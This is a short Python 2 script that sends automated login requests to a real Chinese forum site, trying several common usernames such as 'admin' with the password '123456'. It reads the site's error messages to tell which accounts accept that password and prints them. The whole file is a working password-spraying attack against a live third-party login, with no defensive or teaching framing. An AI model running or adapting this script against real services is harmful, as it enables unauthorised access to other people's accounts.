#coding: gbk
import httplib, urllib

def Check(username, password):
    params = urllib.urlencode({'userid': username, 'passwd': password})
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    conn = httplib.HTTPSConnection("www.bdwm.net")
    conn.request("POST","/bbs/bbslog2.php", params, headers)
    res = conn.getresponse().read()
    conn.close()
    if res.find("密码不正确") != -1:
        return False
    elif res.find("不存在这个用户") != -1:
        return False
    else:
        return True

pwd = ['admin','zhangsan','lisi','wanger','quba']

for i in pwd:
    if Check(i.rstrip(),"123456"):
        print i
    else:
        print "no"